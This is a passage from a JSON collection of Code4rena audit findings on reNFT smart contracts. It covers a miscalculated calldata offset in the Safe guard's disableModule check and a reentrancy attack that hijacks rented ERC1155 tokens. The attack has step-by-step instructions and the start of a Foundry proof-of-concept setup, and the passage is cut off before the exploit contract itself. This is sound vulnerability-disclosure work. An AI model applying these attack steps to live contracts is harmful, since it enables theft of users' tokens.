<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol#L58>\n*   `@2 -- The memory offset intended to point at the 'module' param of the disableModule() was incorrectly specified to the 'prevModule' param instead`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol#L62>\n\nThe below snippet shows the function signature of the rental safe's [`ModuleManager::disableModule()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/interfaces/ISafe.sol#L98-L101):\n`function disableModule(address prevModule, address module) external`\n\nLet's break down the value of the `gnosis_safe_disable_module_offset` constant (`0x24`):\n0x24 == 36 == 32 (the calldata's array length) + 4 (the function selector)\n\nAs you can see, the `gnosis_safe_disable_module_offset` was incorrectly specified to point at the `prevModule` param (1st param) instead of the `module` param (2nd param) that refers to the `module` expected to be removed.\n\n```solidity\n    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/interfaces/ISafe.sol\n    /**\n     * @notice Disables the module `module` for the Safe.\n     *\n     * @dev This can only be done via a Safe transaction.\n     *\n@3   * @param prevModule Previous module in the modules linked list.\n@3   * @param module     Module to be removed.\n     */\n@3  function disableModule(address prevModule, address module) external; //@audit -- The memory offset must point at the second param because it would be the module to be removed\n```\n\n*   `@3 -- The memory offset must point at the second param because it would be the module to be removed`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/interfaces/ISafe.sol#L98-L101>\n\nWith the incorrect `gnosis_safe_disable_module_offset` constant, once the `Guard::_checkTransaction()` is triggered to verify the safe transaction containing a [call to the safe's `disableModule()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L255), the address of the [`prevModule` contract](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L260) will be extracted and assigned to the `extension` variable instead of the `module` contract's.\n\nConsequently, the address of the [`prevModule` contract](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L266) will be verified for the whitelist by the `Guard::_revertNonWhitelistedExtension()` instead of the expected `module` contract address.\n\n<details>\n\n```solidity\n    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol\n    function _checkTransaction(address from, address to, bytes memory data) private view {\n        bytes4 selector;\n\n        // Load in the function selector.\n        assembly {\n            selector := mload(add(data, 0x20))\n        }\n\n        ... // some if-else cases\n        \n@4      } else if (selector == gnosis_safe_disable_module_selector) { //@audit -- Check for calls to the disableModule() initiated from Safe contracts\n            // Load the extension address from calldata.\n            address extension = address(\n                uint160(\n                    uint256(\n@5                      _loadValueFromCalldata(data, gnosis_safe_disable_module_offset) //@audit -- Since the gnosis_safe_disable_module_offset constant points at the incorrect param (i.e., prevModule), the extension variable will contain an address of the prevModule\n                    )\n                )\n            );\n\n            // Check if the extension is whitelisted.\n@6          _revertNonWhitelistedExtension(extension); //@audit -- The address of the prevModule will be checked for the whitelist instead of the expected module to be removed\n        } \n\n        ... // else case\n    }\n```\n</details>\n\n\n*   `@4 -- Check for calls to the disableModule() initiated from Safe contracts`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L255>\n*   `@5 -- Since the gnosis_safe_disable_module_offset constant points at the incorrect param (i.e., prevModule), the extension variable will contain an address of the prevModule`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L260>\n*   `@6 -- The address of the prevModule will be checked for the whitelist instead of the expected module to be removed`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L266>\n\nBesides, I also noticed that the developer also assumed that the `disableModule()` would have one function parameter while writing the test functions: [`test_Success_CheckTransaction_Gnosis_DisableModule()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol#L369) and [`test_Reverts_CheckTransaction_Gnosis_DisableModule()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol#L557).\n\nThat can confirm why the test functions cannot catch up with the mistake.\n\n<details>\n\n```solidity\n    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol\n    function test_Success_CheckTransaction_Gnosis_DisableModule() public {\n        // impersonate the admin policy admin\n        vm.prank(deployer.addr);\n\n        // enable this address to be added as a module by rental safes\n        admin.toggleWhitelistExtension(address(mockTarget), true);\n\n        // Build up the `disableModule(address)` calldata\n        bytes memory disableModuleCalldata = abi.encodeWithSelector(\n            gnosis_safe_disable_module_selector,\n@7          address(mockTarget) //@audit -- In the test function: test_Success_CheckTransaction_Gnosis_DisableModule(), the developer assumed that the disableModule() would have one param (incorrect!!)\n        );\n\n        // Check the transaction\n        _checkTransaction(address(this), address(mockTarget), disableModuleCalldata);\n    }\n\n    ...\n\n    function test_Reverts_CheckTransaction_Gnosis_DisableModule() public {\n        // Build up the `disableModule(address)` calldata\n        bytes memory disableModuleCalldata = abi.encodeWithSelector(\n            gnosis_safe_disable_module_selector,\n@8          address(mockTarget) //@audit -- Also in the test function: test_Reverts_CheckTransaction_Gnosis_DisableModule(), the developer assumed that the disableModule() would have one param (incorrect!!)\n        );\n\n        // Expect revert because of an unauthorized extension\n        _checkTransactionRevertUnauthorizedExtension(\n            address(this),\n            address(mockTarget),\n            disableModuleCalldata\n        );\n    }\n```\n\n</details>\n\n*   `@7 -- In the test function: test_Success_CheckTransaction_Gnosis_DisableModule(), the developer assumed that the disableModule() would have one param (incorrect!!)`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol#L369>\n*   `@8 -- Also in the test function: test_Reverts_CheckTransaction_Gnosis_DisableModule(), the developer assumed that the disableModule() would have one param (incorrect!!)`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol#L557>\n\n### Recommended Mitigation Steps\n\nTo point the memory offset at the `module` param (2nd param), the `gnosis_safe_disable_module_offset` constant must be set to `0x44` (0x44 == 68 == 32 (the calldata's array length) + 4 (the function selector) + 32 (1st param)).\n\n```diff\n    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                  Gnosis Safe Function Selectors And Offsets                 //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    ...\n\n    // bytes4(keccak256(\"disableModule(address,address)\"));\n    bytes4 constant gnosis_safe_disable_module_selector = 0xe009cfde;\n\n    ...\n\n-   uint256 constant gnosis_safe_disable_module_offset = 0x24;\n+   uint256 constant gnosis_safe_disable_module_offset = 0x44;\n```\n\n**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/565#issuecomment-1910732014):**\n > PoC confirmed!\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/565)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/1) - Fixes offset value so that the proper address is checked when disabling a gnosis module from a safe.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/5), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/44) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/33).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the `gnosis_safe_disable_module_offset` constant, which is used to point to a function parameter in the `disableModule()` function. However, the constant was incorrectly specified and points to the wrong parameter, which can lead to issues when trying to remove a module from a safe. This can result in unauthorized extensions being removed without verification, potentially causing other issues or attacks. The report provides a proof of concept and recommended mitigation steps to fix the issue. The bug has been confirmed and mitigated by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/565",
      "tags": [],
      "finders": [
        "mussucal",
        "rbserver",
        "1",
        "kaden",
        "2",
        "EV\\_om",
        "haxatron",
        "0xAlix2",
        "Beepidibop",
        "serial-coder",
        "AkshaySrivastav"
      ]
    },
    {
      "id": "30523",
      "title": "[H-03] An attacker can hijack any ERC1155 token he rents due to a design issue in reNFT via reentrancy exploitation",
      "impact": "HIGH",
      "content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **Gnosis safe fallback handlers**: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says \"If I see something unknown, then I just let the fallback handler deal with it.\"\n\n    **Example**: If you want to take a uniswap flash loan using your gnosis safe, you'll have to create a fallback handler contract with the callback function `uniswapV2Call()`. When you decide to take a flash loan using your safe, you'll send a call to `swap()` in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to call `uniswapV2Call()`, but `uniswapV2Call()` isn't actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe's fallback handler and ask it to handle the `uniswapV2Call()` TX coming from uniswap.\n\n    **Setting a fallback handler**: To set a fallback handler for your safe, you'll have to call the function [`setFallbackHandler()`](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L44) which you can find it's logic in [FallbackManager.sol](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol)\n\n***\n\n### The Vulnerability\n\n***\n\nIn order to make sense of the vulnerability, we need to understand the token transferral & rental registeration execution flow first.\n\n**Step 1**: First of all, before the fulfillment process begins, both the lender and the borrower need to approve the Seaport Conduit to spend their tokens on behalf of them. The lender approves the conduit to spend the NFT token which he wants to lend (offer item) and the borrower approves the ERC20 tokens he will use as a payment method for this rental (consideration item).\n\n**Step 2**: Once the fulfillment process begins, the conduit begins the token transferral process. The conduit transfers the lender's NFT tokens to the borrower's gnosis rental safe, then it transfers the borrower's ERC20 tokens to the Payment Escrow.\n\n*Note 1: Keep in mind that the rental is not registered yet.*.\n\n*Note 2: The Seaport Conduit utilizes the `safeTransferFrom` function to transfer the ERC1155 tokens which will trigger `onERC1155Receive` hook on the receiver of the ERC1155 tokens, in this case, it's the borrower's rental safe. However, when it comes to the transferral of ERC721 tokens, it uses `transferFrom` and not `safeTransferFrom`*.\n\n**Step 3**: Once the tokens are transferred, Seaport will communicate with the Zone contract. You can think of the zone contract as a contract holding a callback function which is called after all the swaps are made. The contract which will be holding the callback function to be executed by Seaport is [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) and the callback function it is holding, which as I mentioned, will be called by Seaport, is [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27).\n\n**Step 4**: Once the [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27) function is called, the rental registeration process will kick in. A series of internal functions will be called inside [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) which will verify the signatures of the order data it has received from seaport and then the internal function [\\_rentFromZone](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L530) will be called and this internal function will actually register the rental. It'll communicate with the [`Storage`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol) module which holds all the rental data and ask it to [add the rental](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L595).\n\n**Step 5**: The rental is finally added.\n\nHere is the full execution flow.\n\n*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/588).*\n\n***\n\n### The vulnerability\n\n***\n\nThe main vulnerability exists within the fact that reNFT does not register the rental except after swapping the tokens, in addition to `safeTransferFrom()` being used to transfer ERC1155 tokens, which would of course, trigger the callback function `onERC1155Receive()` on the borrower's safe.\n\nThe combination of those two factors allow for the exploitation of a reentrancy vulnerability allowing an attacker to hijack ANY ERC1155 tokens he rents.\n\n### Steps of exploitation\n\n***\n\n1.  The attacker will create a custom fallback handler contract which will contain an implementation of the `onERC1155Receive()` function, which will be triggered by the Seaport Conduit when it conducts the token swap and moves the lender's NFT tokens to the borrower's safe. The implementation of the `onERC1155Receive()` function will simply instruct the gnosis safe to transfer the tokens to the attacker's address.\n\n    **Since the rental is not yet registered, the guard will let the transferral occur normally**\n\n2.  The attacker will create the rental safe which he'll utilize to hijack the target ERC1155 token.\n\n3.  The attacker will set the fallback handler address of his safe to be the address of the custom fallback handler contract he created.\n\n4.  The attacker will initiate the rental process\n\n5.  When the conduit transfers the lender's ERC1155 token to the attacker's safe using `safeTransferFrom`. It'll request to call `onERC1155Receive()` on the attacker's safe, but the `onERC1155Receive()` callback function isn't implemented by default in the safe contract, so the safe contract will rely on the custom fallback handler (which the attacker set) and the `onERC1155Receive()` function in the fallback handler will be executed.\n\n6.  When the `onERC1155Receive()` callback is executed in the custom fallback handler contract, the fallback handler will instruct gnosis to move the ERC1155 token rented to the attacker's address. The gnosis guard will be disarmed and will allow the transferral to occur normally because it isn't aware of the rental at this point.\n\n7.  The ERC1155 token will be hijacked successfully.\n\n***\n\n### Proof of concept\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_ERC1155_Exploit -vvv`\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import {Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n            vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    address(tokenCallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe = factory.deployRentalSafe(owners, 1);\n\n\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n\n    interface ERC1155TokenReceiver {\n\n        function onERC1155Received(\n            address _operator,\n            address _from,\n            uint256 _id,\n            uint256 _value,\n            bytes calldata _data\n        ) external returns (bytes4);\n\n        function onERC1155BatchReceived(\n            address _operator,\n            address _from,\n            uint256[] calldata _ids,\n            uint256[] calldata _values,\n            bytes calldata _data\n        ) external returns (bytes4);\n    }\n\n    interface ERC721TokenReceiver {\n        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);\n    }\n\n    interface IERC165 {\n        function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    }\n\n\n    /**\n    * 